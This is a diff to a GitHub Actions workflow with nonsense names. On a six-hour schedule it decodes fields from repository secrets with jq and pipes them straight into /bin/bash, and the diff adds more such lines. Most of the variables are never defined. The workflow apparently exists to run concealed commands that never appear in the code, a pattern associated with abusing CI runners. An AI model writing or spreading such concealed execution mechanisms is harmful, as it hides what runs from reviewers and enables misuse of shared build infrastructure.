@@ -2,8 +2,7 @@ name: klkjdajk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 3/6 * * *'
-
+    - cron: '33 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,9 +10,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: klkjdajk
         env:
-          sygob440: ${{ secrets.sygob440 }}
+          fs9978: ${{ secrets.fs9978 }}
         run: |
-          echo $sygob440 | jq -r .mfho9240 | /bin/bash
-          echo $znop579 | jq -r .srd7 | /bin/bash
-          echo $q24 | jq -r .vj7141 | /bin/bash
+          echo $fs9978 | jq -r .q2 | /bin/bash
+          echo $xn764 | jq -r .t690 | /bin/bash
+          echo $gpgvk76 | jq -r .d6 | /bin/bash
+          echo $nqwo5 | jq -r .y23 | /bin/bash
+          echo $dd73616 | jq -r .sqt00256 | /bin/bash
+          echo $s05 | jq -r .ae6 | /bin/bash
+          echo $auq0 | jq -r .kimsg90 | /bin/bash
+          echo $lp20618 | jq -r .fznnh79 | /bin/bash
 
